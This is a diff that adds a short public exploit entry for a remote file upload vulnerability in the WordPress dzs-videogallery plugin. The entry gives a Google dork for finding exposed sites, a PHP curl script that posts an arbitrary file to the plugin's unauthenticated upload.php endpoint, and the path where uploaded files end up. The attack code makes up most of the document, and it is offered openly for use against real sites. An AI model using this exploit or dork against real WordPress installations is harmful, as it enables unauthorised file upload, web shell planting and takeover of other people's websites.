@@ -1,0 +1,31 @@
+###################################################################################################
+# Exploit Title: WordPress dzs-videogallery Plugins Remote File Upload Vulnerability
+# Author: iskorpitx
+# Date: 22/11/2013
+# Vendor Homepage: http://digitalzoomstudio.net
+# Themes Link: http://digitalzoomstudio.net/docs/wpvideogallery/
+# Infected File: upload.php
+# Category: webapps
+# Google dork:inurl:/wp-content/plugins/dzs-videogallery/
+# Tested on : Windows/Linux
+###################################################################################################
+
+<?php 
+$uploadfile=""; 
+$ch = curl_init("http://127.0.0.1/wp-content/plugins/dzs-videogallery/admin/dzsuploader/upload.php"); 
+curl_setopt($ch, CURLOPT_POST, true); 
+curl_setopt($ch, CURLOPT_POSTFIELDS,
+        array('file_field'=>"@$uploadfile")); 
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
+$postResult = curl_exec($ch); curl_close($ch); 
+print "$postResult"; 
+?>
+
+http://127.0.0.1/wp-content/plugins/dzs-videogallery/admin/dzsuploader/upload/upload.html
+
+
+_________________________________
+
+All http://www.mavi1.org members
+
+
